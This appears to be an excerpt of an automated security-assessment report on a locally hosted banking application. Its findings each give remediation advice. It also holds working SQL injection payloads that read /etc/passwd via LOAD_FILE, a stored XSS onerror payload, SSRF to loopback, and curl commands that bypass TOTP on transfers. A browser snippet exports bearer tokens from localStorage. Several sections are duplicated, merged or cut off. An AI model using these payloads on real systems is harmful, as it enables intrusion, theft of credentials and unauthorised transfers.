The HTTP listener did not redirect to HTTPS and processed a credential-shaped POST, returning an ordinary INVALID_CREDENTIALS authentication response rather than rejecting the request for insecure transport. The equivalent route was unavailable on HTTPS ports 443 and 8443, and port 8081 itself rejected TLS with WRONG_VERSION_NUMBER. These checks do not support the reverse-proxy or alternate-TLS explanation, while the scanner's successful login evidence shows that the same HTTP handler returns a bearer token for valid administrator credentials.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"username":"validator_invalid_user","password":"definitely-not-a-real-password"}' http://localhost:8081/api/admin/auth/login
```

## 9. Authenticated SQL injection in customer search enables database extraction and local file reads

- Finding reference: KOWT-016
- Severity: high
- OWASP: A03
- Source: specialist agent
- Validation: confirmed
- Affected URL: http://localhost:8081/api/admin/customers?page=1&per_page=15&search=
- CVSS: 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

### Description
The `search` parameter on the admin customer endpoint is concatenated into a MariaDB query in `AdminUserController.php`. An authenticated administrator can alter the query, extract database metadata through error messages, and invoke `LOAD_FILE()`. Testing also confirmed that the application connects to MariaDB as `root@localhost`.

### Impact
An authenticated administrator could read arbitrary database records and local files accessible to the MariaDB process. Because the application uses the MariaDB root account, exploitation could expose credentials, configuration files, and other sensitive data, or allow broad modification and disruption of the application database. Testing stopped before customer records or other personal data were extracted.

### Likelihood
High. The injection is available through a normal query parameter and was reproduced consistently using the supplied administrator session. Exploitation does not require timing-based techniques, and detailed database errors provide a direct extraction channel.

### Recommendation
Replace string-built SQL in `AdminUserController.php` with prepared statements and bound parameters. Bind the search term strictly as a value, and escape `LIKE` wildcards separately if literal matching is required. Validate `page` and `per_page` as bounded integers before using them in query construction. Configure the application to use a dedicated MariaDB account with only the permissions required for its schema and without the `FILE` privilege. Do not connect as root. Return generic API errors instead of SQL details or stack traces, and rotate any credentials or secrets that may have been accessible to the database process.

### Evidence
```
A nonexistent search term returned no customers and `total:0`, while `search=' OR 1=1-- ` returned customer results and `total:18`, confirming control over SQL query logic. A single quote produced a MariaDB syntax error. Error-based extraction disclosed `root@localhost` and the table names `admin_revoked_tokens,admin_users,users`. A bounded `LOAD_FILE('/etc/passwd')` probe returned the beginning of the file, including `root:x:0:0:root:/root:/bin/sh` and `bin:x:1:1`, in a duplicate-entry database error.
```

### Request Evidence
```
GET /api/admin/customers?search=%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7e%2CLEFT%28LOAD_FILE%280x2f6574632f706173737764%29%2C40%29%2C0x7e%2CFLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29a%29--%20&page=1&per_page=15 HTTP/1.1
Authorization: Bearer [REDACTED_BEARER]
```

### Response Evidence
```
HTTP/1.1 500 Internal Server Error
{"success":false,"error":{"code":"INTERNAL_ERROR","message":"SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~root:x:0:0:root:\/root:\/bin\/sh\\x0Abin:x:1:1:~1' for key 'group_key'"}}
```

### Validation Note
A clean nonexistent search returned 200 with no customers, while the tautology payload returned the customer dataset and total 18. A lone quote produced a payload-dependent MariaDB syntax error from PDO at AdminUserController.php line 28, and a bounded error-based LOAD_FILE probe disclosed the start of /etc/passwd in a duplicate-entry error. These differentials rule out a hardcoded error or ordinary search behavior, and no benign explanation remained.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 'http://localhost:8081/api/admin/customers?page=1&per_page=15&search=zzzz'"'"'%20OR%20(SELECT%201%20FROM%20(SELECT%20COUNT(*)%2CCONCAT(LEFT(LOAD_FILE('"'"'%2Fetc%2Fpasswd'"'"')%2C80)%2CFLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)--%20' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin_fresh** or an equivalent user).

Log in as an administrator, capture the Authorization bearer token from the customer-search request in the browser Network panel, and replay the PoC with that token.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 10. Authenticated SSRF in profile avatar import

- Finding reference: KOWT-005
- Severity: high
- OWASP: A10
- Source: specialist agent
- Validation: confirmed
- Affected URL: http://localhost:8081/api/profile/avatar
- CVSS: 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

### Description
The profile avatar endpoint accepts a user-supplied URL in the JSON `url` field, fetches that URL from the application server, and returns the response body as a base64 data URL. An authenticated user can therefore make server-side requests to attacker-selected URLs.

### Impact
An authenticated attacker could use the application server to request internal services, loopback addresses, or cloud metadata endpoints and read accessible response bodies through `avatar_data`. This could expose internal service data or cloud instance metadata.

### Likelihood
High. The endpoint is available to authenticated users and accepted an arbitrary external URL. The response confirmed that the server fetched the supplied resource and returned its contents. No host, scheme, or response content restrictions were observed.

### Recommendation
Allow only approved image hosts and HTTPS URLs. Resolve each hostname and reject loopback, private, link-local, multicast, and reserved IPv4 and IPv6 addresses. Repeat these checks for every redirect and connect only to the validated address to prevent DNS rebinding. Require an expected image content type, decode the response with a safe image library, and reject non-image content. Apply strict response size and timeout limits.

### Evidence
```
An authenticated POST request containing `{"url":"https://example.com"}` returned HTTP 200. The response included `avatar_data` with a `data:text/html;base64` value, a size of 559 bytes, and `source_url` set to `https://example.com`. The base64 content decoded to the Example Domain HTML, including `<h1>Example Domain</h1>`, confirming that the server fetched and returned content from the supplied URL.
```

### Request Evidence
```
POST /api/profile/avatar HTTP/1.1
Content-Type: application/json
Authorization: Bearer [REDACTED_BEARER]

{"url":"https://example.com"}
```

### Response Evidence
```
HTTP/1.1 200

{"success":true,"data":{"avatar_data":"data:text/html;base64,PCFkb2N0eXBlIGh0bWw+PGh0bWw...PGgxPkV4YW1wbGUgRG9tYWluPC9oMT4...","size":559,"source_url":"https://example.com"},"message":"OK"}
```

### Validation Note
Using the valid `amelia_fresh` session, the external baseline fetched and returned Example Domain. Changing only the supplied URL to `http://127.0.0.1:8081/` also returned HTTP 200 and exposed the loopback service's HTML as base64, including the distinctive page title `The Bank of Ed - Banking Without Borders`. This rules out simple URL echoing, static response text, and internal-address filtering.

## 11. Customer credentials and bearer tokens transmitted over HTTP

- Finding reference: KOWT-027

- Source: Dynamic

- Affected URL: http://localhost:8081/api/auth/login

### Description
The customer login endpoint is available over cleartext HTTP. It accepts customer email addresses and passwords and returns JWT bearer tokens without transport encryption.

### Impact
An attacker able to observe network traffic could capture customer passwords or bearer tokens. The attacker could then access financial account data or perform transactions as the affected customer.

### Likelihood
Exploitation requires an attacker with access to the network path between the customer and the application. The successful login request confirms that credentials and the returned bearer token are transmitted over HTTP.

### Recommendation
Serve the banking interface and API only over HTTPS. Redirect all HTTP requests to HTTPS, ensure credentials and tokens are never sent over cleartext connections, and enable HSTS after TLS is deployed across the application.

### Evidence
```
A POST request containing the supplied test customer's email address and password was sent to http://localhost:8081/api/auth/login. The endpoint returned HTTP 200 with a successful login response and a JWT bearer token over the same cleartext HTTP connection.
```

### Request Evidence
```
POST http://localhost:8081/api/auth/login
{"email":"zoe.williams@example.com","password":"password"}
```

### Response Evidence
```
HTTP 200: {"success":true,"data":{"user":{"id":3,"email":"zoe.williams@example.com",...},"token":"[REDACTED_JWT]"},"message":"Login successful"}
```

### Validation Note
The cleartext endpoint is live and processes login bodies directly, returning a credential-specific USER_NOT_FOUND response instead of redirecting to HTTPS or rejecting insecure transport. HTTPS was unavailable both on the default port and on port 8081, and changing the Host header did not reveal a localhost-only virtual-host restriction. These checks do not provide an innocent TLS-termination or transport-enforcement explanation for the scanner's recorded successful login and JWT response.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"email":"transport-check.invalid@example.invalid","password":"not-a-real-credential"}' http://localhost:8081/api/auth/login
```

### Evidence

## 14. External transfers bypass required TOTP verification

- Finding reference: KOWT-011
- Severity: high
- OWASP: A04
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transfers/external
- CVSS: 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

### Description
The external transfer execution endpoint completes manual transfers without the TOTP code required by the transfer preflight check.

### Impact
An attacker with access to a customer session could transfer funds to an external account without completing the application's second-factor verification.

### Likelihood
Exploitation requires an authenticated customer session, but the bypass is straightforward because the execution endpoint accepts a transfer request with no totp_code.

### Recommendation
Reject external transfer requests unless TOTP verification has succeeded. After verification, issue a short-lived, single-use server-side authorization token bound to the exact source account, destination account, amount, and currency, and require that token when executing the transfer.

### Evidence
```
POST /api/transfers/check for a manual transfer returned {"requires_totp":true,"reason":"manual_entry","totp_configured":false}. A direct POST to /api/transfers/external without totp_code returned HTTP 201 with transaction_id 36, "totp_verified":false, "status":"completed", and a new source balance of 3449.75, reduced from 3450.75.
```

### Request Evidence
```
POST /api/transfers/external body {"from_account_id":1,"to_bsb":"062-001","to_account_number":"99999999","payee_name":"AESPA Test","amount":"1.00","currency":"AUD","description":"aespa-workflow-0912"}; no totp_code.
```

### Response Evidence
```
HTTP 201 {"transaction_id":36,...,"totp_verified":false,"new_from_balance":"3449.75","status":"completed"}
```

### Validation Note
Using the fresh Amelia session, I reproduced the required precondition: POST /api/transfers/check for a manual one-cent transfer returned requires_totp=true with reason manual_entry and totp_configured=false. I then sent the same manual transfer to /api/transfers/external without totp_code; it returned 201, created transaction 37, reported totp_verified=false and status=completed, and reduced the source balance from 3449.75 to 3449.74. The destination was another account owned by the same user to minimize impact, but the endpoint still classified and completed it as a manual transfer, so this does not provide an innocent enforcement explanation.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' --data-raw '{"from_account_id":1,"amount":0.01,"to_bsb":"062-001","to_account_number":"10000002"}' http://localhost:8081/api/transfers/external -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **amelia_fresh2** or an equivalent user).

Sign in as Amelia Chen, then copy the bearer token from the Authorization header of an authenticated API request and use it for this request.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 15. Passwords stored using unsalted MD5

- Finding reference: KOWT-019
- Severity: high
- OWASP: A02
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/auth/register
- CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### Description
The registration endpoint hashes new customer passwords using unsalted MD5 and returns the resulting password hash in the HTTP response.

### Impact
An attacker who obtains stored hashes could recover common passwords quickly using precomputed tables or commodity cracking hardware. Identical passwords produce identical hashes, allowing attackers to identify accounts that share a password.

### Likelihood
The behavior was reproduced through the public registration workflow. Password recovery still requires access to other users' stored hashes, which was not demonstrated.

### Recommendation
Store passwords using Argon2id, scrypt, or bcrypt with a unique salt and an appropriate work factor. Migrate existing MD5 hashes after successful authentication. Remove password hashes from all API responses.

### Evidence
```
Registering xss0912@example.invalid with the password "password" returned HTTP 201 with "password_hash":"5f4dcc3b5aa765d61d8327deb882cf99", which is the MD5 digest of "password". An earlier registration with a one-character password also returned a 32-character hexadecimal hash.
```

### Request Evidence
```
POST /api/auth/register body included password "password" for xss0912@example.invalid.
```

### Response Evidence
```
HTTP 201 user object included "password_hash":"5f4dcc3b5aa765d61d8327deb882cf99".
```

### Validation Note
The scanner captured a live 201 registration response whose password_hash value, 5f4dcc3b5aa765d61d8327deb882cf99, is exactly MD5("password"). I replayed the complete request against the same email with two different passwords; both now return the same 409 duplicate-account response, which confirms the account exists but does not provide an innocent explanation for the original one-time 201 response. Read-only attempts to inspect the existing weakpass_user account found no applicable profile endpoint, and the exact digest plus the explicit password_hash field leaves no reasonable encoding, hardcoded-template, or static-export explanation.

## 16. SQL injection in authenticated customer search

- Finding reference: KOWT-024
- Severity: high
- OWASP: A03
- Source: specialist agent
- Validation: confirmed
- Affected URL: http://localhost:8081/api/admin/customers?page=1&per_page=15&search=%27
- CVSS: 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

### Description
The admin customer search endpoint passes the search parameter into a MariaDB query without safe parameter binding. Supplying a single quote causes a database syntax error, indicating that user-controlled input alters the SQL statement.

### Impact
An authenticated administrator could manipulate the database query and potentially access or modify database records. Additional impact, including local file reads or service disruption, depends on the privileges assigned to the database account.

### Likelihood
High. Exploitation requires an authenticated administrator session, but the injection point was directly confirmed using a single-character payload. Detailed MariaDB errors also provide feedback that could help develop further payloads.

### Recommendation
Replace SQL string concatenation with prepared statements and bound parameters for the search value. Parse and validate page and per_page as integers before using them. Return a generic error response to clients and record SQL errors, stack traces, file paths, and line numbers only in protected server logs.

### Evidence
```
An authenticated GET request with search=%27 returned HTTP 500 and a MariaDB SQLSTATE[42000] syntax error stating that the error occurred near a single quote at line 1. The captured output also identified PDO->query() in AdminUserController.php at line 28.
```

### Request Evidence
```
GET /api/admin/customers?page=1&per_page=15&search=%27 using session admin_fresh
```

### Response Evidence
```
HTTP 500: {"success":false,"error":{"code":"INTERNAL_ERROR","message":"SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1"}}
```

### Validation Note
An authenticated clean request returned 200 with normal customer data, while the otherwise identical request containing a single quote returned 500 with a MariaDB SQLSTATE[42000] syntax error. The error is therefore payload-dependent rather than hardcoded, and the response trace identifies PDO->query() in AdminUserController.php at line 28. This differential directly shows that the search value changes the SQL statement, and no concrete innocent explanation remains.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 'http://localhost:8081/api/admin/customers?page=1&per_page=15&search=%27' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin** or an equivalent user).

Log in as an administrator, then copy the bearer token from the Authorization request header in the browser Network panel.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 17. SQL injection in authenticated customer search

- Finding reference: KOWT-055
- Severity: high
- OWASP: A03
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/admin/customers?page=1&per_page=15&search=%27%20OR%201%3D1--%20
- CVSS: 7.2 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)

### Description
The search parameter on the admin customer listing accepts a SQL boolean payload that changes the query result.

### Impact
An authenticated administrator or attacker with an administrator token could manipulate database queries and may be able to read, modify, or delete additional database data.

### Likelihood
High after administrator access is obtained. The boolean payload returned the full customer set instead of an empty search result.

### Recommendation
Use parameterized queries for every search condition. Do not concatenate search input into SQL, and add tests using quotes, comments, and boolean expressions.

- Validation: confirmed
- Affected URL: http://localhost:8081/api/admin/customers?page=1&per_page=15&search=zznomatch%25%27%20OR%20(SELECT%201%20FROM%20(SELECT%20COUNT(*)%2CCONCAT(SUBSTRING(LOAD_FILE(%27%2Fetc%2Fpasswd%27)%2C1%2C48)%2CFLOOR(RAND(0)*2))%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x)%20a)--%20
- CVSS: 7.2 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)

### Description
The authenticated customer search endpoint is vulnerable to error-based SQL injection through the search parameter. The injected query executes as the MariaDB account root@localhost and can call LOAD_FILE to read files accessible to the database server process.

### Impact
An authenticated administrator could extract database contents and read local files available to the MariaDB process. This could expose application configuration, database credentials, signing keys, and other stored secrets.

### Likelihood
High. Error-based SQL injection and local file access were directly demonstrated. Exploitation requires authenticated administrator access.

### Recommendation
Use prepared statements with bound parameters for the customer search query. Run MariaDB under a dedicated least-privilege account without the FILE privilege. Configure secure_file_priv to restrict file operations, and ensure the database service account cannot read application secrets.

### Evidence
```
A database identity probe produced "Duplicate entry 'root@localhost1' for key 'group_key'". An error-based payload using SUBSTRING(LOAD_FILE('/etc/passwd'),1,48) returned HTTP 500 and disclosed the excerpt "Duplicate entry 'root:x:0:0:root:\/root:\/bin\/sh\\x0Abin:x:1:1:bin:\/bin1' for key 'group_key'".
```

### Request Evidence
```
GET /api/admin/customers with search set to a duplicate-entry error payload containing SUBSTRING(LOAD_FILE('/etc/passwd'),1,48).
```

### Response Evidence
```
HTTP 500: SQLSTATE[23000] ... 1062 Duplicate entry 'root:x:0:0:root:\/root:\/bin\/sh\\x0Abin:x:1:1:bin:\/bin1' for key 'group_key'.
```

### Validation Note
Using the fresh admin session, the clean search returned HTTP 200 with an empty customer list and no SQL error. The reported payload returned HTTP 500 from PDO->query() and disclosed the beginning of /etc/passwd inside a MariaDB duplicate-entry error. This payload-dependent differential rules out a hardcoded error message and directly demonstrates SQL execution plus LOAD_FILE access.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 'http://localhost:8081/api/admin/customers?page=1&per_page=15&search=zznomatch%25%27%20OR%20(SELECT%201%20FROM%20(SELECT%20COUNT(*)%2CCONCAT(SUBSTRING(LOAD_FILE(%27%2Fetc%2Fpasswd%27)%2C1%2C48)%2CFLOOR(RAND(0)*2))%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x)%20a)--%20' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin_fresh** or an equivalent user).

Log in as an administrator and copy the bearer token from the Authorization request header or browser storage.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 20. Stored cross-site scripting through avatar URL

- Finding reference: KOWT-026
- Severity: high
- OWASP: A03
- Source: specialist agent
- Validation: confirmed
- Affected URL: http://localhost:8081/api/profile/avatar
- CVSS: 8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H)

### Description
The avatar import endpoint stores and returns attacker-controlled URL content without output encoding. When the affected profile loads, the application inserts the stored source URL into the page using jQuery .html(). HTML placed in the URL fragment is parsed as markup, allowing an event handler to execute in the banking application's origin.

### Impact
An attacker who can set or influence a user's avatar URL can execute JavaScript when the affected profile is loaded. The script runs with the victim's authenticated browser state and could read the bearer token from localStorage, access account data, and perform authenticated banking actions as the victim. The payload remains stored in avatar_url and executes on subsequent profile loads.

### Likelihood
High. The test confirmed automatic execution when the stored profile was loaded. The payload required no filter bypass, although an attacker must be able to set or influence the affected user's avatar URL.

### Recommendation
Do not insert source_url into the DOM with jQuery .html(). Render status text with textContent or jQuery .text(). If HTML output is required, apply encoding appropriate for the output context. Accept only expected HTTP and HTTPS avatar URLs, reject or remove URL fragments, and avoid returning attacker-controlled URL text to an HTML sink. Add a Content-Security-Policy that blocks inline event handlers as defense in depth.

### Evidence
```
An authenticated POST for Amelia supplied a URL containing #<img src=x onerror="document.body.dataset.avatarxss='a0912'">. The HTTP 200 response preserved that payload verbatim in data.source_url, and the stored Amelia profile contained the same payload in avatar_url. Loading http://localhost:8081/banking/#/profile as Amelia satisfied the DOM assertion for body[data-avatarxss="a0912"], confirming JavaScript execution.
```

### Request Evidence
```
POST /api/profile/avatar with JSON body {"url":"https://httpbin.org/base64/WA==#<img src=x onerror=\"document.body.dataset.avatarxss='a0912'\">"} under Amelia's authenticated session.
```

### Response Evidence
```
HTTP 200: {"success":true,"data":{"avatar_data":"data:text\/html; charset=utf-8;base64,WA==","size":1,"source_url":"https:\/\/httpbin.org\/base64\/WA==#<img src=x onerror=\"document.body.dataset.avatarxss='a0912'\">"},"message":"OK"}
```

### Validation Note
The replayed authenticated POST returned HTTP 200 and preserved the HTML fragment verbatim in data.source_url, and a follow-up profile read showed the same raw value persisted in avatar_url. The profile application sends that value back to the import API on load and inserts data.source_url with jQuery .html() without encoding; the page response has no Content-Security-Policy header to block the inline onerror handler. These checks rule out URL normalization, output encoding, safe DOM assignment, and restrictive CSP as benign explanations, consistent with the scanner's successful DOM execution assertion.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"url":"https://httpbin.org/base64/WA==#<img src=x onerror=\"document.body.dataset.avatarxss='"'"'a0912'"'"'\">"}' http://localhost:8081/api/profile/avatar -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **amelia_xss** or an equivalent user).

Log in as Amelia Chen, copy the bearer token from the browser's Authorization request header or token storage, and send it as the Authorization header.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 21. Transaction details accessible across customer accounts

- Finding reference: KOWT-023
- Severity: high
- OWASP: A01
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transactions/1
- CVSS: 7.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

### Description
The transaction detail endpoint does not verify that the requested transaction belongs to an account owned by the authenticated customer. An authenticated user can retrieve another customer's transaction by supplying its numeric ID.

### Impact
Any authenticated customer could enumerate sequential transaction IDs and view other customers' transfer amounts, descriptions, source and destination account references, status, and timestamps.

### Likelihood
Exploitation requires only an authenticated customer session and a valid transaction ID. The numeric IDs are sequential, making other transactions practical to enumerate, and the captured request succeeded without access to either account involved.

### Recommendation
Before returning a transaction, verify that its source or destination account belongs to the authenticated customer. Apply this authorization check to every transaction lookup and return 404 or 403 when the transaction is outside the customer's ownership scope. Add tests covering access to transactions owned by other customers.

### Evidence
```
Using Zoe Williams' authenticated session, GET /api/transactions/1 returned HTTP 200 with transaction ID 1, from_account_id 1, to_account_id 2, amount 500.00, and description "Monthly savings." Zoe's account baseline was account ID 6, and GET /api/accounts/1 returned HTTP 404 under the same session, confirming that the disclosed transaction referenced accounts outside her ownership scope.
```

### Request Evidence
```
GET /api/transactions/1 with use_session=zoe_fresh
```

### Response Evidence
```
HTTP 200: {"success":true,"data":{"id":1,"from_account_id":1,"to_account_id":2,"amount":"500.00","description":"Monthly savings",...}}
```

### Validation Note
Anonymous access returned 401, so the endpoint is not intentionally public. With `zoe_fresh`, account 6 returned 200 while account 1 returned 404, confirming Zoe's ownership scope; the same session then retrieved transaction 1 with HTTP 200 even though it references accounts 1 and 2. The response is structured transaction JSON rather than an SPA shell, and the session-scope check rules out proxy session confusion.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 http://localhost:8081/api/transactions/1 -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **zoe_fresh** or an equivalent user).

Log in as Zoe Williams and copy the bearer token from the Authorization request header, then send it as `Authorization: Bearer <token>`.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

```js
a.download = 'aespa-poc-auth.txt'; a.click();
```

## 22. Unverified users can self-issue credit cards with a $25,000 limit

- Finding reference: KOWT-015
- Severity: high
- OWASP: A04
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/accounts
- CVSS: 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

### Description
The POST /api/accounts endpoint allows a newly registered user to create a credit-card account with a $25,000 balance and credit limit. The observed request required no prior application, approval, identity verification, or affordability assessment.

### Impact
Any registered user could obtain an immediately usable credit facility and generated card details, creating a high risk of fraud and direct financial loss.

### Likelihood
Exploitation is straightforward for any registered user. The tested request required only an account type, account name, and currency, and the server issued the credit-card account immediately.

### Recommendation
Require a server-side credit application and approval process before creating any credit-card account. Enforce identity verification, affordability and credit checks, approved credit limits, and recorded authorization. Generate card details and activate the credit balance only after all required checks have succeeded.

### Evidence
```
A newly registered user sent POST /api/accounts with only account_type set to credit_card, an account name, and AUD currency. The server returned HTTP 201 and created account 103 with a 25000.00 balance, a 25000.00 credit limit, and generated card number, expiry, and CVV values.
```

### Request Evidence
```
POST /api/accounts as newly registered user body {"account_type":"credit_card","account_name":"AESPA Test Card","currency":"AUD"}
```

### Response Evidence
```
HTTP 201 account id 103, account_type credit_card, balance 25000.00, credit_limit 25000.00, with a generated card number, expiry, and CVV.
```

### Validation Note
Using the working non-admin `aespa_a9633bc3` session, I repeated the reported POST with only account_type, account_name, and currency. The server returned 201 and immediately created a second active credit-card account with a $25,000 balance and limit plus a card number, expiry, and CVV, so this was neither seeded demo data nor a one-card allowance. The same user's profile exposed no verification or approval state, and the public application page did not identify the workflow as a sandbox simulation.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"account_type":"credit_card","account_name":"Validation Card 2","currency":"AUD"}' http://localhost:8081/api/accounts -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup

## 23. Exposed machine token bypasses payment transfer authentication

- Finding reference: KOWT-041
- Severity: high
- OWASP: A07
- Source: specialist agent
- Validation: unconfirmed
- Affected URL: http://localhost:8081/api/payments/transfer
- CVSS: 8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

### Description
The payment transfer endpoint accepts a static machine token disclosed in plaintext by the system settings API. Supplying this token without a customer or administrator session passed authentication and reached transfer request validation.

### Impact
An attacker who obtains the exposed token could submit requests to the privileged payment transfer workflow. The endpoint accepts source and destination account details and an amount, creating a risk of unauthorized fund transfers.

### Likelihood
High while the disclosed token remains active. The settings API returned the credential in plaintext, and the transfer endpoint accepted it unchanged. No transfer was executed during testing.

### Recommendation
Rotate the exposed token immediately and stop returning machine credentials in API responses. Replace the shared static token with short-lived, narrowly scoped service credentials restricted to the transfer API and the intended service identity. Consider mTLS or signed requests for server-to-server authentication, add replay protection, monitor attempts to use the old token, and review transfer logs for unauthorized activity.

### Evidence
```
A customer bearer token was rejected with HTTP 401 and "Invalid or unauthorized machine token." The system settings API returned a plaintext machine_token. An anonymous POST to /api/payments/transfer using that token returned HTTP 422 with required-field validation errors, showing that authentication succeeded. The same request without Authorization returned HTTP 401. No transfer was executed.
```

### Request Evidence
```
POST /api/payments/transfer HTTP/1.1
Host: localhost:8081
Authorization: Bearer [REDACTED_BEARER]
Content-Type: application/json

{}
```

### Response Evidence
```
HTTP/1.1 422 Unprocessable Entity

{"success":false,"error":{"code":"VALIDATION_ERROR","message":"Validation failed","details":{"from_bsb":["The from_bsb field is required."],"from_account_number":["The from_account_number field is required."],"to_bsb":["The to_bsb field is required."],"to_account_number":["The to_account_number field is required."],"amount":["The amount field is required."]}}}
```

### Validation Note
The collected evidence confirms that the admin frontend calls GET /api/admin/system/settings and displays a returned machine_token, but the response from that endpoint was never captured. The saved HTTP token sessions tested against the transfer endpoint were all rejected with 401, so the claimed 422 authentication bypass was not reproduced with an identifiable credential. A material proof gap remains: there is no decisive request showing that a token obtained from the settings response is accepted by /api/payments/transfer, and the evidence does not establish a benign explanation either.

## 24. Exposed machine token grants access to payment processing API

- Finding reference: KOWT-039
- Severity: high
- OWASP: A07
- Source: specialist agent
- Validation: false_positive
- Affected URL: http://localhost:8081/api/payments/process
- CVSS: 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

### Description
A plaintext machine token disclosed by the system settings response is accepted as a bearer credential by the payment processing endpoint. Requests without a token or with an arbitrary token are rejected, while the disclosed token passes authentication and reaches request-field validation.

### Impact
An attacker who obtains the disclosed token can authenticate directly to the payment API and submit payment-processing requests. Depending on downstream validation and processor behavior, this could expose payment data or allow unauthorized transaction attempts.

### Likelihood
High. The disclosed credential is active and can be replayed remotely as a bearer token without additional authentication.

### Recommendation
Rotate and invalidate the exposed token immediately. Remove machine credentials from system settings responses and return only masked identifiers in administrative views. Store replacement credentials in a secrets manager, restrict secret-management actions, and add short expiration periods, audience restrictions, regular rotation, and audit logging.

### Evidence
```
A request without credentials returned HTTP 401 with `Missing or invalid Authorization header.` An arbitrary bearer token also returned HTTP 401 with `Invalid or unauthorized machine token.` Replaying the machine token disclosed by the system settings response returned HTTP 422 with validation errors for `merchant_id`, `card_number`, `expiry`, and `amount`. Reaching field validation confirms that the disclosed token passed authentication.
```

### Request Evidence
```
POST /api/payments/process HTTP/1.1
Host: localhost:8081
Authorization: Bearer [REDACTED_BEARER]
Content-Type: application/json

{}
```

### Response Evidence
```
HTTP/1.1 422

